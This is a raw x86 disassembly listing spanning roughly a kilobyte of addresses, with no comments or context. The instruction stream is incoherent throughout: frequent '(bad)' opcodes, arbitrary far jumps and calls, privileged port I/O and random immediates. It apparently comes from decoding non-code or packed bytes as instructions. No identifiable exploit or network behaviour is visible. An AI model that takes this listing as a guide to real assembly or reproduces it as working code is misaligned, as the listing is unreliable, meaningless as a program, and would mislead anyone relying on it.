  41f99e:	int    0x16
  41f9a0:	inc    esp
  41f9a1:	sbb    eax,0x5a48bd2a
  41f9a6:	cli    
  41f9a7:	ror    BYTE PTR [edi+0x20d5afea],0xb3
  41f9ae:	retf   0x5959
  41f9b1:	push   ss
  41f9b2:	into   
  41f9b3:	mov    esp,0xadb54b1c
  41f9b8:	(bad)  
  41f9b9:	shl    DWORD PTR [ecx],cl
  41f9bb:	inc    esi
  41f9bc:	mov    ah,0x21
  41f9be:	and    al,0x76
  41f9c0:	fs add esi,eax
  41f9c3:	stos   DWORD PTR es:[edi],eax
  41f9c4:	fwait
  41f9c5:	push   0xa92a9a1b
  41f9ca:	mov    eax,DWORD PTR [edi+edx*8+0x18]
  41f9ce:	popa   
  41f9cf:	pop    edx
  41f9d0:	inc    esi
  41f9d1:	cmp    eax,0xcd12c90e
  41f9d6:	pop    edi
  41f9d7:	not    DWORD PTR [edx+eiz*8]
  41f9da:	adc    cl,BYTE PTR [edi-0x3a691d71]
  41f9e0:	sbb    al,0x87
  41f9e2:	jl     0x41fa47
  41f9e4:	xchg   ecx,eax
  41f9e5:	pop    ecx
  41f9e6:	push   ss
  41f9e7:	inc    edx
  41f9e8:	mov    ds:0xc2b13f0e,al
  41f9ed:	fs (bad) 
  41f9f0:	push   ebp
  41f9f1:	mov    cl,BYTE PTR [edi]
  41f9f3:	cmp    BYTE PTR [ebp+0x36ebe45d],0x81
  41f9fa:	inc    ebp
  41f9fb:	retf   0x7b7e
  41f9fe:	lea    esi,[edi-0x65]
  41fa01:	sbb    BYTE PTR [ebp-0x68af80a9],dh
  41fa07:	or     eax,0x147a217f
  41fa0c:	adc    DWORD PTR [ebx-0x72b506e2],0xd62b882d
  41fa16:	daa    
  41fa17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa18:	arpl   WORD PTR [ecx-0x5c],sp
  41fa1b:	mov    ebx,0x40a94c28
  41fa20:	pop    eax
  41fa21:	aaa    
  41fa22:	idiv   DWORD PTR [eax+0x7de57984]
  41fa28:	adc    BYTE PTR [ebx+edx*2-0x64c72e05],cl
  41fa2f:	sub    DWORD PTR [ecx+0xa28da64],ebp
  41fa35:	mov    ch,0x7b
  41fa37:	imul   esi,DWORD PTR ds:0xc9e0f945,0x56
  41fa3e:	jp     0x41fa4d
  41fa40:	mov    ah,0xb5
  41fa42:	jnp    0x41fa46
  41fa44:	cmp    al,0x80
  41fa46:	shl    edi,cl
  41fa48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa49:	and    ecx,esi
  41fa4b:	mov    edx,edi
  41fa4d:	fcomp  DWORD PTR [edi-0x4aa3af5f]
  41fa53:	cmp    BYTE PTR [edi-0x5051e5ef],ch
  41fa59:	call   0x39483994
  41fa5e:	xor    eax,0x4794ac6a
  41fa63:	xlat   BYTE PTR ds:[ebx]
  41fa64:	aas    
  41fa65:	stc    
  41fa66:	xchg   edi,eax
  41fa67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa68:	lods   al,BYTE PTR ds:[esi]
  41fa69:	in     al,0x2e
  41fa6b:	(bad)  
  41fa6d:	adc    al,0x49
  41fa6f:	cld    
  41fa70:	out    dx,al
  41fa71:	push   esp
  41fa72:	outs   dx,DWORD PTR ds:[esi]
  41fa73:	dec    DWORD PTR [esp+ebp*8-0x3a]
  41fa77:	xchg   ecx,eax
  41fa78:	jae    0x41fa82
  41fa7a:	pop    esi
  41fa7b:	mov    cl,0x2e
  41fa7d:	push   0xdaa667b4
  41fa82:	aas    
  41fa83:	mov    dl,BYTE PTR [ebx]
  41fa85:	push   esi
  41fa86:	sub    al,bh
  41fa88:	enter  0xc885,0xdc
  41fa8c:	hlt    
  41fa8d:	mov    ebx,0x75691947
  41fa92:	mov    ecx,0xd16134bd
  41fa97:	je     0x41fa77
  41fa99:	jl     0x41fad0
  41fa9b:	out    0x4f,al
  41fa9d:	inc    ecx
  41fa9e:	fmul   QWORD PTR es:[ecx-0x71]
  41faa2:	dec    ecx
  41faa3:	jo     0x3ed89985
  41faa9:	ret    
  41faaa:	push   0x55
  41faac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faad:	arpl   WORD PTR [eax+0x76cf1bfe],ax
  41fab3:	call   0x869c:0x3ad03a8a
  41faba:	push   esi
  41fabb:	(bad)  
  41fabc:	sub    edi,DWORD PTR [edi-0x16]
  41fabf:	(bad)  
  41fac0:	sbb    eax,0x97327944
  41fac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fac6:	pop    ecx
  41fac7:	dec    edx
  41fac8:	xor    eax,DWORD PTR [ebx]
  41faca:	icebp  
  41facb:	add    DWORD PTR [esi],esp
  41facd:	fist   DWORD PTR [edi]
  41facf:	imul   edi,DWORD PTR [ecx-0x1d],0x4f8644b2
  41fad6:	jp     0x41fb32
  41fad8:	cmp    ch,ch
  41fada:	clc    
  41fadb:	imul   ebp,DWORD PTR [ecx+0x56cde31],0xffffffd8
  41fae2:	pop    ebp
  41fae3:	nop
  41fae4:	fstp   st(2)
  41fae6:	cmp    BYTE PTR [esi],cl
  41fae8:	int    0xb2
  41faea:	jno    0x41fab2
  41faec:	cmp    esp,DWORD PTR [ebx]
  41faee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faef:	inc    ecx
  41faf0:	outs   dx,BYTE PTR ds:[esi]
  41faf1:	push   DWORD PTR [esi*8-0x5b331368]
  41faf8:	xchg   BYTE PTR [ebp-0x8d71e12],dl
  41fafe:	cmp    eax,0x411d7dba
  41fb03:	inc    ebx
  41fb04:	xchg   esi,eax
  41fb05:	data16 fistp QWORD PTR [eax]
  41fb08:	mov    ds:0xc613,eax
	...
  41fb29:	add    BYTE PTR [eax+0x4a],bl
  41fb2c:	dec    edx
  41fb2d:	push   edi
  41fb2e:	pop    edx
  41fb2f:	push   edi
  41fb30:	pop    ebp
  41fb31:	dec    edi
  41fb32:	mov    dh,0x0
  41fb34:	dec    edx
  41fb35:	push   ecx
  41fb36:	or     eax,0x62d3fae9
  41fb3b:	mov    al,BYTE PTR [ecx]
  41fb3d:	add    BYTE PTR [ecx-0x68fffffa],cl
  41fb43:	in     al,0x29
  41fb45:	push   esi
  41fb46:	jbe    0x41fb49
  41fb48:	(bad)  
  41fb49:	int    0x3b
  41fb4b:	ins    DWORD PTR es:[edi],dx
  41fb4c:	out    dx,al
  41fb4d:	dec    edx
  41fb4e:	fldz   
  41fb50:	outs   dx,DWORD PTR ds:[esi]
  41fb51:	mov    cs:0x503c242f,al
  41fb57:	dec    esp
  41fb58:	clc    
  41fb59:	pop    esp
  41fb5a:	fcom   DWORD PTR [eax+0x12e8ca41]
  41fb60:	aam    0x57
  41fb62:	ror    BYTE PTR [esi],1
  41fb64:	hlt    
  41fb65:	push   esp
  41fb66:	scas   al,BYTE PTR es:[edi]
  41fb67:	mov    ah,BYTE PTR [edi+0x4a]
  41fb6a:	ret    
  41fb6b:	sbb    al,BYTE PTR [esi+0x50]
  41fb6e:	jns    0x41fbb7
  41fb70:	dec    ebx
  41fb71:	push   ecx
  41fb72:	inc    esp
  41fb73:	je     0x41fbe5
  41fb75:	inc    edi
  41fb76:	icebp  
  41fb77:	or     DWORD PTR ds:0x8445dea7,esp
  41fb7d:	stos   DWORD PTR es:[edi],eax
  41fb7e:	inc    eax
  41fb7f:	cmp    BYTE PTR [ebx+eax*2-0x4d7b44ef],0xb8
  41fb87:	adc    ebp,ebx
  41fb89:	mov    edi,0x7e1bf0c6
  41fb8e:	jbe    0x41fbd8
  41fb90:	lods   al,BYTE PTR ds:[esi]
  41fb91:	leave  
  41fb92:	rcl    DWORD PTR [edx+eiz*2+0x680ae897],cl
  41fb99:	pop    edi
  41fb9a:	(bad)  
  41fb9b:	lea    ecx,[edi-0x4f]
  41fb9e:	(bad)  
  41fb9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fba0:	dec    edx
  41fba1:	addr16 pop edi
  41fba3:	fld    DWORD PTR [ebp+0x71]
  41fba6:	js     0x41fbc9
  41fba8:	pusha  
  41fba9:	xchg   ecx,eax
  41fbaa:	outs   dx,DWORD PTR ds:[esi]
  41fbab:	add    al,0x1c
  41fbad:	push   eax
  41fbae:	ficom  DWORD PTR [edx+edi*4]
  41fbb1:	cdq    
  41fbb2:	dec    esp
  41fbb3:	jmp    DWORD PTR [ebp+0x62dd7252]
  41fbb9:	push   esi
  41fbbb:	je     0x41fc25
  41fbbd:	mov    gs,WORD PTR [ebx+eax*2]
  41fbc0:	(bad)  
  41fbc1:	and    ch,BYTE PTR [edx]
  41fbc3:	mov    DWORD PTR [ebx+0x56a49f1f],eax
  41fbc9:	imul   ecx,DWORD PTR [esi-0x53a7c723],0x80ced49f
  41fbd3:	inc    ebx
  41fbd4:	mov    edx,0x203eabb0
  41fbd9:	addr16 dec esp
  41fbdb:	xchg   edi,eax
  41fbdc:	mov    edx,0xbe64c656
  41fbe1:	lods   al,BYTE PTR ds:[esi]
  41fbe2:	retf   0x15e
  41fbe5:	pop    esi
  41fbe6:	gs sbb al,0x10
  41fbe9:	arpl   WORD PTR ds:0x22f6524,bp
  41fbef:	and    ah,BYTE PTR [edi+edx*4-0x7f55bae]
  41fbf6:	mov    dl,0xbb
  41fbf8:	retf   
  41fbf9:	xchg   ebx,eax
  41fbfa:	push   0x184906a4
  41fbff:	xor    eax,0xebc01df8
  41fc04:	sbb    ah,BYTE PTR [ebx]
  41fc06:	add    DWORD PTR [ebp-0x3cb999d5],0xffffffe5
  41fc0d:	addr16 imul edi,esi,0xffffffb6
  41fc11:	sti    
  41fc12:	or     BYTE PTR gs:[esp-0x3ad6dc2b],cl
  41fc1a:	cld    
  41fc1b:	les    edx,FWORD PTR ds:0x16127a9f
  41fc21:	fadd   QWORD PTR [edi+0x352d70c8]
  41fc27:	cmp    BYTE PTR [esi+edx*4-0x704a66c0],al
  41fc2e:	pop    ebp
  41fc2f:	jmp    0xf159:0xbd3b0cfc
  41fc36:	and    al,0xf9
  41fc39:	out    dx,eax
  41fc3a:	mov    ah,0x59
  41fc3c:	inc    esi
  41fc3d:	jo     0x60b0c0e0
  41fc43:	sub    bh,BYTE PTR [ebp-0x1b]
  41fc46:	sbb    eax,0xf7e70c0a
  41fc4b:	fidiv  DWORD PTR [esi]
  41fc4d:	test   eax,0x518cc37a
  41fc52:	xor    eax,0xf996b0f9
  41fc57:	push   0xffffffad
  41fc59:	(bad)  
  41fc5a:	fdivp  st(4),st
  41fc5c:	jae    0x41fc59
  41fc5e:	mov    ah,0x14
  41fc60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc61:	mov    fs,eax
  41fc63:	push   edx
  41fc64:	mov    eax,0x8e910f12
  41fc69:	and    ch,BYTE PTR [ecx+0x5e]
  41fc6c:	cmp    BYTE PTR [esi],bl
  41fc6e:	addr16 icebp 
  41fc70:	push   esi
  41fc71:	inc    edx
  41fc72:	test   BYTE PTR [ebx-0x68582108],0x13
  41fc79:	dec    edi
  41fc7a:	sub    al,BYTE PTR [ebx-0x3c]
  41fc7d:	xchg   ebx,eax
  41fc7e:	mov    bl,0x95
  41fc80:	add    eax,ebx
  41fc82:	dec    ecx
  41fc83:	sbb    al,0xc7
  41fc85:	mov    cs,WORD PTR [ecx+0xd]
  41fc88:	jo     0x41fc86
  41fc8a:	push   ecx
  41fc8b:	in     eax,dx
  41fc8c:	std    
  41fc8d:	dec    edi
  41fc8e:	retf   0x2fe8
  41fc91:	(bad)  
  41fc92:	cld    
  41fc93:	rcl    DWORD PTR [ecx+edi*4],cl
  41fc96:	mov    esi,0xd914e127
  41fc9b:	xchg   edi,eax
  41fc9c:	dec    ebx
  41fc9d:	push   ds
  41fc9e:	pop    ss
  41fc9f:	xor    BYTE PTR [eax+0x33],bl
  41fca2:	je     0x41fcdc
  41fca4:	add    BYTE PTR [esp+eax*4],bl
  41fca7:	push   es
  41fca8:	jb     0x41fc75
  41fcaa:	add    BYTE PTR [ebx],bh
  41fcac:	fldcw  WORD PTR [eax]
  41fcae:	sub    al,0xd8
  41fcb0:	push   edx
  41fcb1:	in     eax,0x41
  41fcb3:	out    dx,eax
  41fcb4:	std    
  41fcb5:	adc    ah,BYTE PTR [ebx+0xa1048b6]
  41fcbb:	mov    cl,0x35
  41fcbd:	fadd   DWORD PTR [ecx+0x49]
  41fcc0:	aad    0xf
  41fcc2:	fnstsw WORD PTR [eax+ebx*1]
  41fcc5:	adc    eax,0x2dc8389d
  41fcca:	jl     0x41fc52
  41fccc:	jae    0x41fd24
  41fcce:	je     0x41fcf5
  41fcd0:	add    al,0x79
  41fcd2:	ss enter 0xe0d4,0xf6
  41fcd7:	pop    edi
  41fcd8:	xchg   esp,eax
  41fcd9:	fcomp  st(3)
  41fcdb:	xor    ebx,ebx
  41fcdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcde:	inc    edi
  41fcdf:	test   eax,0xa9920228
  41fce4:	mov    dl,0x80
  41fce6:	push   esi
  41fce7:	ret    
  41fce8:	mov    al,0x26
  41fcea:	sbb    DWORD PTR [ebx-0x12],ebp
  41fced:	add    BYTE PTR [edx-0x1ffcb8b9],al
  41fcf3:	bound  ebp,QWORD PTR [ebp+edx*1+0x5815583]
  41fcfa:	xor    BYTE PTR [ecx-0x5132c843],dl
  41fd00:	xor    cl,BYTE PTR [ebp+0x3e]
  41fd03:	lods   eax,DWORD PTR ds:[esi]
  41fd04:	cmp    al,0xa
  41fd06:	cld    
  41fd07:	jge    0x41fd01
  41fd09:	fwait
  41fd0a:	rcr    BYTE PTR [edx+0x69],0x92
  41fd0e:	repnz mov ebp,0xfa7d0967
  41fd14:	push   0x764b4dee
  41fd19:	add    ebx,DWORD PTR [edi+0x6c]
  41fd1c:	es xor dh,ah
  41fd1f:	jle    0x41fcc1
  41fd21:	(bad)  
  41fd22:	repnz push esp
  41fd24:	pop    ecx
  41fd25:	adc    DWORD PTR [edx+ebx*1+0x42bffc1],0x5a
  41fd2d:	(bad)  
  41fd2f:	add    eax,ebx
  41fd31:	ins    BYTE PTR es:[edi],dx
  41fd32:	and    al,bl
  41fd34:	mov    ebx,0xfe39da6a
  41fd39:	clc    
  41fd3a:	cmc    
  41fd3b:	in     eax,0x2f
  41fd3d:	popf   
  41fd3e:	cmp    dl,bl
  41fd40:	arpl   WORD PTR [ebp+0x7976fba3],dx
  41fd46:	mov    al,0xca
  41fd48:	fs mov eax,0x9f90be97
  41fd4e:	lods   eax,DWORD PTR ds:[esi]
  41fd4f:	push   es
  41fd50:	or     BYTE PTR ds:0x8823f752,bh
  41fd56:	pop    edx
  41fd57:	mov    bh,0xea
  41fd59:	dec    eax
  41fd5a:	cmp    esi,DWORD PTR [edi-0x8]
  41fd5d:	jns    0x41fd6b
  41fd5f:	dec    BYTE PTR [edi+edi*2+0x5f]
  41fd63:	cmp    DWORD PTR [ecx-0x4c],eax
  41fd66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd67:	and    cl,al
  41fd69:	xchg   esp,eax
  41fd6a:	ret    
  41fd6b:	mov    BYTE PTR [edx],ah
  41fd6d:	push   esi
  41fd6e:	push   eax
  41fd6f:	mov    al,0x68
  41fd71:	out    dx,al
  41fd72:	jbe    0x41fd1f
  41fd74:	pop    ds
  41fd75:	add    al,0xd8
  41fd77:	or     eax,edx
  41fd79:	mov    ds:0xb9db849e,eax
  41fd7e:	jo     0x41fd94
  41fd80:	jp     0x41fd6c
  41fd82:	mov    ds:0x9356d26c,eax
  41fd87:	rcl    BYTE PTR [ecx+0xe],1
  41fd8a:	sub    eax,0x556d66d1
  41fd8f:	xchg   ebx,eax
  41fd90:	pusha  
  41fd91:	jmp    0x953ec2c0
  41fd96:	push   edi
  41fd97:	mov    al,0x3e
  41fd99:	adc    al,0x57
  41fd9b:	ss dec ebx
  41fd9d:	xchg   esi,eax
  41fd9e:	fs stos BYTE PTR es:[edi],al
  41fda0:	cmp    BYTE PTR [ebx-0x7c4a5e43],bh
  41fda6:	xor    eax,0xa09f5f1e
  41fdab:	sbb    BYTE PTR [edi-0x3a],bh
  41fdae:	and    BYTE PTR [ebp-0x37774adb],bl
  41fdb4:	lock sahf 
  41fdb6:	lahf   
  41fdb7:	and    esp,DWORD PTR [ecx+0x2919e205]
  41fdbd:	std    
  41fdbe:	mov    ch,0x2d
  41fdc0:	push   eax
  41fdc1:	lods   al,BYTE PTR ds:[esi]
  41fdc2:	mov    bh,0x55
  41fdc4:	pop    ss
  41fdc5:	sub    esi,ecx
  41fdc7:	xchg   ebp,eax
  41fdc8:	pop    edi
  41fdc9:	test   eax,0xdd217a2f
  41fdce:	push   ebp
  41fdcf:	lds    esp,FWORD PTR [ecx+ebx*8-0x12]
  41fdd3:	adc    ebp,DWORD PTR [ebx]
  41fdd5:	aad    0xdd
  41fdd7:	dec    ebx
  41fdd8:	adc    ebx,DWORD PTR [edi+0x9]
  41fddb:	mov    al,ds:0x39d92272
  41fde0:	cli    
  41fde1:	sbb    ecx,edi
  41fde3:	jg     0x41fe17
  41fde5:	jle    0x41fe17
  41fde7:	ret    0x332e
  41fdea:	lods   eax,DWORD PTR ds:[esi]
  41fdeb:	fisubr DWORD PTR [esi-0x1257aef1]
  41fdf1:	retf   0x76ae
  41fdf4:	repnz lds edi,FWORD PTR [ebx]
  41fdf7:	fnstenv [esi+0x14]
  41fdfa:	push   edi
  41fdfb:	popf   
  41fdfc:	or     bl,BYTE PTR [eax]
  41fdfe:	retf   0xdfd9
  41fe01:	pop    ss
  41fe02:	jg     0x41fdba
  41fe04:	sub    esp,ecx
  41fe06:	sub    BYTE PTR [ebx+0x4e7ddcd7],ch
  41fe0c:	pop    ss
  41fe0d:	leave  
  41fe0e:	push   0xde8c70b4
  41fe13:	sahf   
  41fe14:	aaa    
  41fe15:	and    edi,DWORD PTR [edi-0x46eabe51]
  41fe1b:	push   ecx
  41fe1c:	push   eax
  41fe1d:	push   0x14ec5f8d
  41fe22:	test   DWORD PTR [eax+0x45ac9021],edx
  41fe28:	outs   dx,BYTE PTR ds:[esi]
  41fe29:	dec    ebp
  41fe2a:	mov    ebp,0x81c7f881
  41fe2f:	stos   BYTE PTR es:[edi],al
  41fe30:	test   BYTE PTR [ebx+0x5e283438],ch
  41fe36:	test   BYTE PTR [edx+0x7],al
  41fe39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe3a:	push   ss
  41fe3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe3c:	or     BYTE PTR [edx+0x57],ch
  41fe3f:	out    dx,eax
  41fe40:	(bad)  
  41fe41:	mov    dl,0x25
  41fe43:	aas    
  41fe44:	push   0xffffffe6
  41fe46:	mov    edx,0x6ad8fcb0
  41fe4b:	shl    ah,cl
  41fe4d:	call   0x8d0d5f13
  41fe52:	(bad)  
  41fe53:	jge    0x41fe00
  41fe55:	add    BYTE PTR [esi],bl
  41fe57:	lahf   
  41fe58:	adc    DWORD PTR [esi+0x3ea4e38b],edi
  41fe5e:	in     al,0x8c
  41fe60:	mov    ds:0x56f6faa3,eax
  41fe65:	leave  
  41fe66:	pop    edi
  41fe67:	cmp    DWORD PTR [ebp+0x4d],ebx
  41fe6a:	push   cs
  41fe6b:	daa    
  41fe6c:	mov    bl,BYTE PTR [eax]
  41fe6e:	sbb    esp,DWORD PTR [ecx+0x53610b57]
  41fe74:	fldenv [edi+0x1075cb0b]
  41fe7a:	inc    ebp
  41fe7b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe7d:	mov    edi,0x624f3701
  41fe82:	in     eax,dx
  41fe83:	cmp    DWORD PTR [ebp+0x737a4eda],esi
  41fe89:	xor    eax,0xe15e160b
  41fe8e:	cld    
  41fe8f:	dec    eax
  41fe90:	daa    
  41fe91:	sub    esp,esp
  41fe93:	dec    eax
  41fe94:	pop    es
  41fe95:	dec    ebx
  41fe96:	sub    al,0x94
  41fe98:	scas   al,BYTE PTR es:[edi]
  41fe99:	xor    BYTE PTR [ebx],al
  41fe9b:	out    0x32,al
  41fe9d:	push   cs
  41fe9e:	out    dx,eax
  41fe9f:	sub    ah,BYTE PTR [ebx]
  41fea1:	jae    0x41fee9
  41fea3:	pop    esp
  41fea4:	test   al,0x2c
  41fea6:	pusha  
  41fea7:	inc    esi
  41fea8:	dec    edx
  41fea9:	cmp    DWORD PTR [bp+si-0x1c04],ecx
  41feae:	out    dx,eax
  41feaf:	mov    al,bh
  41feb1:	ret    
  41feb2:	fwait
  41feb3:	mov    ch,0xec
  41feb5:	lods   eax,DWORD PTR ds:[esi]
  41feb6:	in     eax,dx
  41feb7:	clc    
  41feb8:	test   BYTE PTR [eax+0x105ebc7f],al
  41febe:	(bad)  
  41fec0:	sbb    bl,BYTE PTR [esi+edi*2+0x4]
  41fec4:	sbb    al,0x73
  41fec6:	jge    0x41fed6
  41fec8:	dec    esp
  41fec9:	mul    DWORD PTR ds:0x2be6a2e7
  41fecf:	mov    edi,0xfdcb8cd2
  41fed4:	mov    cl,0xd9
  41fed6:	jle    0x41fe74
  41fed8:	fsubr  DWORD PTR [edi+ecx*4-0x46f232a7]
  41fedf:	mov    dh,BYTE PTR [edi+ebx*2]
  41fee2:	pop    esp
  41fee3:	xchg   ebx,eax
  41fee4:	aaa    
  41fee5:	ja     0x41fe86
  41fee7:	sbb    ch,ch
  41fee9:	mov    ds:0xf8f60b92,al
  41feee:	pushf  
  41feef:	icebp  
  41fef0:	shl    BYTE PTR [edi-0x5d37ce61],cl
  41fef6:	push   0x104bc5a9
  41fefb:	push   edx
  41fefc:	jge    0x41ff5a
  41fefe:	pop    edx
  41feff:	out    0x6c,eax
  41ff01:	and    dl,bh
  41ff03:	into   
  41ff04:	fsubr  st(5),st
  41ff06:	add    al,0x1a
  41ff08:	das    
  41ff09:	sbb    DWORD PTR [ebx+0x5dddd4b5],0x1572ad6c
  41ff13:	xor    BYTE PTR [edi+0x68],ah
  41ff16:	add    al,bh
  41ff18:	in     eax,dx
  41ff19:	inc    eax
  41ff1a:	cs mov ch,0x38
  41ff1d:	inc    ecx
  41ff1e:	sbb    DWORD PTR [ebx+0x352d8e23],edi
  41ff24:	cmp    eax,0x2eca8542
  41ff29:	jle    0x41ff68
  41ff2b:	aaa    
  41ff2c:	cli    
  41ff2d:	push   ebx
  41ff2e:	jge    0x41fec2
  41ff30:	lods   al,BYTE PTR ds:[esi]
  41ff31:	sbb    edx,DWORD PTR [ebx-0x2b4f2f7c]
  41ff37:	xchg   esi,eax
  41ff38:	hlt    
  41ff39:	cmp    DWORD PTR [ecx],edi
  41ff3b:	inc    esi
  41ff3c:	fdiv   DWORD PTR [edi]
  41ff3e:	dec    edi
  41ff3f:	adc    BYTE PTR [ebp+0x4b5a17da],bl
  41ff45:	xor    cl,BYTE PTR [edx-0x1841c0bd]
  41ff4b:	pop    ds
  41ff4c:	call   0x5660:0x10e59df9
  41ff53:	rol    ebx,0x70
  41ff56:	dec    esi
  41ff57:	sahf   
  41ff58:	pop    ecx
  41ff59:	push   edi
  41ff5a:	sbb    BYTE PTR [ebp+0x7b36bd15],0xbb
  41ff61:	mov    dl,0x81
  41ff63:	lahf   
  41ff64:	sti    
  41ff65:	mov    ebx,0x825da92a
  41ff6a:	cmp    edx,edi
  41ff6c:	or     al,0x9c
  41ff6e:	add    eax,0xf480c6ee
  41ff73:	xor    eax,0x5e3ab26e
  41ff78:	jns    0x41ff66
  41ff7a:	xchg   esi,eax
  41ff7b:	pop    edx
  41ff7c:	std    
  41ff7d:	mov    dl,0x8
  41ff7f:	gs mov bl,0x72
  41ff82:	in     eax,0xae
  41ff84:	fldcw  WORD PTR [ebx-0x2a78a21d]
  41ff8a:	jmp    0x4111:0x93c175c9
  41ff91:	sbb    dh,BYTE PTR [ebx-0x3797648f]
  41ff97:	mov    ebp,0x88441b
  41ff9c:	enter  0x124a,0x7
  41ffa0:	jecxz  0x41ffd4
  41ffa2:	dec    eax
  41ffa3:	nop
  41ffa4:	push   es
  41ffa5:	adc    bl,dl
  41ffa7:	xlat   BYTE PTR ds:[ebx]
  41ffa8:	add    edi,DWORD PTR [edi+0x64]
  41ffab:	pop    edx
  41ffac:	retf   0xbc2f
  41ffaf:	mov    dl,0x57
  41ffb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffb2:	in     eax,dx
  41ffb3:	lahf   
  41ffb4:	jle    0x41ff59
  41ffb6:	cmp    BYTE PTR [ecx],ah
  41ffb8:	jl     0x420023
  41ffba:	inc    ebx
  41ffbb:	in     al,0x87
  41ffbd:	or     al,0xfd
  41ffbf:	mov    esp,ebp
  41ffc1:	fiadd  DWORD PTR [esi+0x52]
  41ffc4:	pusha  
  41ffc5:	stos   BYTE PTR es:[edi],al
  41ffc6:	das    
  41ffc7:	in     eax,dx
  41ffc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffc9:	mov    edx,0xa0624c5
  41ffce:	inc    ebp
  41ffcf:	mov    eax,ss:0x1e52cf36
  41ffd5:	adc    edi,DWORD PTR [edx]
  41ffd7:	loope  0x41ff80
  41ffd9:	sti    
  41ffda:	pop    esp
  41ffdb:	lahf   
  41ffdc:	jle    0x41ff70
  41ffde:	adc    eax,0x9fa69ec9
  41ffe3:	mov    ebp,0x51512605
  41ffe8:	fadd   DWORD PTR [edi+0x767e8d03]
  41ffee:	jecxz  0x42003f
  41fff0:	mov    ds:0x6d76b911,eax
  41fff5:	jmp    0x6fcaa957
  41fffa:	sbb    al,0x81
  41fffc:	(bad)  
  41fffd:	pop    ss
  41fffe:	mov    al,0x40
  420000:	xor    edx,ecx
  420002:	xchg   ecx,eax
  420003:	scas   al,BYTE PTR es:[edi]
  420004:	aad    0x7e
  420006:	jbe    0x42005e
  420008:	or     ecx,ebx
  42000a:	out    0x7f,eax
  42000c:	cmc    
  42000d:	jb     0x41ffe5
  42000f:	ret    0xc9fe
  420012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420013:	repz test ecx,ebp
  420016:	std    
  420017:	and    cl,dl
  420019:	jmp    0x41ffda
  42001b:	sbb    al,0x45
  42001d:	xor    DWORD PTR [eax],edi
  42001f:	xchg   ecx,eax
  420020:	xor    dh,BYTE PTR [ecx+0x40]
  420023:	jp     0x42001f
  420025:	cmp    BYTE PTR [edi-0x28],dh
  420028:	add    al,0xfe
  42002a:	or     BYTE PTR [ecx+0x213c6db4],dl
  420030:	sbb    edx,DWORD PTR [edi]
  420032:	add    BYTE PTR [edx],ch
  420034:	shr    DWORD PTR [ecx-0x77],cl
  420037:	push   cs
  420038:	mov    bh,BYTE PTR [edi+0x5e792f62]
  42003e:	add    dl,BYTE PTR ds:0x8500e98f
  420044:	call   0x1e44:0x5d530a75
  42004b:	jns    0x420098
  42004d:	jne    0x420042
  42004f:	mov    al,0x45
  420051:	add    al,0xd9
  420053:	mov    ds:0x1f739484,eax
  420058:	sub    BYTE PTR [edi-0x40f419e],bh
  42005e:	jne    0x4200d1
  420060:	cli    
  420061:	test   BYTE PTR [ecx],dh
  420063:	sub    DWORD PTR [ebp+ebp*1+0x42],eax
  420067:	(bad)  
  420068:	fnstenv [esp+edx*8-0x5e]
  42006c:	sub    DWORD PTR ds:0x17d509dc,esi
  420072:	popw   ds
  420074:	pop    eax
  420075:	cmp    BYTE PTR [eax+esi*8-0x6fc4401c],dh
  42007c:	adc    al,0x17
  42007e:	mov    dl,0x5d
  420080:	pushf  
  420081:	(bad)  
  420082:	leave  
  420083:	out    dx,eax
  420084:	fbld   TBYTE PTR [ecx+eax*2-0x7bc012ad]
  42008b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42008c:	pop    ss
  42008d:	jno    0x4200a8
  42008f:	clc    
  420090:	jmp    0xc54f:0x86974509
  420097:	push   es
  420098:	iret   
  420099:	cld    
  42009a:	popf   
  42009b:	mov    edi,0x4f80dfe3
  4200a0:	loope  0x420085
  4200a2:	adc    bl,BYTE PTR gs:[ebx+0x556612c6]
  4200a9:	pop    ebp
  4200aa:	sahf   
  4200ab:	adc    eax,0xd698d571
  4200b0:	icebp  
  4200b1:	cdq    
  4200b2:	xor    eax,0x4c910958
  4200b7:	xchg   DWORD PTR [eax-0x7e],edi
  4200ba:	mov    ebx,0x6b506205
  4200bf:	mov    ds:0x2f928c88,eax
  4200c4:	adc    edi,esp
  4200c6:	cmp    DWORD PTR [ecx+ebp*2+0x714860b4],edx
  4200cd:	sub    eax,0x3650abd9
  4200d2:	mov    DWORD PTR [esi],esi
  4200d4:	imul   esp,DWORD PTR [edi+0x3d],0xfffffffe
  4200d8:	jne    0x42007b
  4200da:	(bad)  
  4200db:	jne    0x42013d
  4200dd:	push   0xd3635420
  4200e2:	mov    al,ds:0x9148655d
  4200e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e8:	aas    
  4200e9:	adc    al,0xac
  4200eb:	mov    esi,DWORD PTR [ebx+0xd]
  4200ee:	aaa    
  4200ef:	lahf   
  4200f0:	or     al,0x1e
  4200f2:	mov    al,ds:0x7bfc5107
  4200f7:	sub    DWORD PTR [ebx+0x3c],ecx
  4200fa:	sbb    al,BYTE PTR [edx]
  4200fc:	int    0x5d
  4200fe:	dec    esp
  4200ff:	test   al,0x94
  420101:	sbb    bh,BYTE PTR [edi-0x3cc5e904]
  420107:	aaa    
  420108:	lods   al,BYTE PTR ds:[esi]
  420109:	mov    cl,0xf1
  42010b:	fcomi  st,st(2)
  42010d:	outs   dx,BYTE PTR ds:[esi]
  42010e:	inc    edx
  42010f:	inc    esi
  420110:	test   BYTE PTR [ebp-0x71],dl
  420113:	cdq    
  420114:	mov    cl,0x9a
